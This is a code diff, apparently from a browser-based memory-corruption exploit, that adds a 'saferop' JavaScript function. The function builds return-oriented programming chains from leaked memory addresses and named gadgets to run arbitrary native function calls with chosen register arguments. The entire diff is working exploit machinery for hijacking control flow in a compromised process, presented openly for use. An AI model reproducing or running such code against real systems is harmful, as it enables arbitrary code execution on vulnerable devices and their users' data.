@@ -72,6 +72,124 @@ var krop = function(p, addr) {
 };
 
 /* Called to start a new ROP chain */
+var saferop = function(p, addr) {
+  this.ropChain = undefined;
+  this.ropChainPtr = undefined;
+  this.ropChainEndPtr = undefined;
+
+  if(addr == undefined)
+  {
+    this.ropChain    = new Uint32Array(0x4000);
+    this.ropChainPtr = p.read8(p.leakval(this.ropChain).add32(0x28));
+    this.ropChainEndPtr = this.ropChainPtr.add32(0x4000*4);
+  }
+  else
+  {
+    this.ropChainPtr = addr;
+    this.ropChainEndPtr = this.ropChainPtr.add32(0x4000*4);
+  }
+
+  this.count = 0;
+
+  /* Clears the chain */
+  this.clear = function()
+  {
+    this.count = 0;
+    this.runtime = undefined;
+
+    for(var i = 0; i < 0x4000 - 0x8; i += 8)
+    {
+      p.write8(this.ropChainPtr.add32(i), 0);
+    }
+  };
+
+  /* Gets the current chain index and increments it */
+  this.getChainIndex = function()
+  {
+    this.count++;
+    return this.count-1;
+  }
+
+  /* Pushes a gadget or value on the stack */
+  this.push = function(val)
+  {
+    p.write8(this.ropChainPtr.add32(this.getChainIndex() * 8), val);
+  }
+
+  /* Writes a 64-bit value to given location */
+  this.push64 = function(where, what)
+  {
+    this.push(window.gadgets["pop rdi"]);
+    this.push(where);
+    this.push(window.gadgets["pop rsi"]);
+    this.push(what);
+    this.push(window.gadgets["mov qword ptr [rdi], rsi"]);
+  }
+
+  /* Sets up a function call into a module by address */
+  this.call = function (rip, rdi, rsi, rdx, rcx, r8, r9)
+  {
+    if(rdi != undefined)
+    {
+      this.push(window.gadgets["pop rdi"]);
+      this.push(rdi);
+    }
+
+    if(rsi != undefined)
+    {
+      this.push(window.gadgets["pop rsi"]);
+      this.push(rsi);
+    }
+
+    if(rdx != undefined)
+    {
+      this.push(window.gadgets["pop rdx"]);
+      this.push(rdx);
+    }
+
+    if(rcx != undefined)
+    {
+      this.push(window.gadgets["pop rcx"]);
+      this.push(rcx);
+    }
+
+    if(r8 != undefined)
+    {
+      this.push(window.gadgets["pop r8"]);
+      this.push(r8);
+    }
+
+    if(r9 != undefined)
+    {
+      this.push(window.gadgets["pop r9"]);
+      this.push(r9);
+    }
+
+    this.push(rip);
+    return this;
+  }
+
+  /* Sets up a return value location*/
+  this.saveReturnValue = function(where)
+  {
+    this.push(window.gadgets["pop rdi"]);
+    this.push(where);
+    this.push(window.gadgets["mov qword ptr [rdi], rax"]);
+  }
+
+  /* Loads the ROP chain and initializes it */
+  this.run = function()
+  {
+    var retv = p.loadchain(this);
+    this.clear();
+
+    return retv;
+  }
+
+  return this;
+};
+
+/* Called to start a new ROP chain */
 var rop = function(p, addr) {
   this.ropChainSize = 0x4000;
   this.ropChain = undefined;
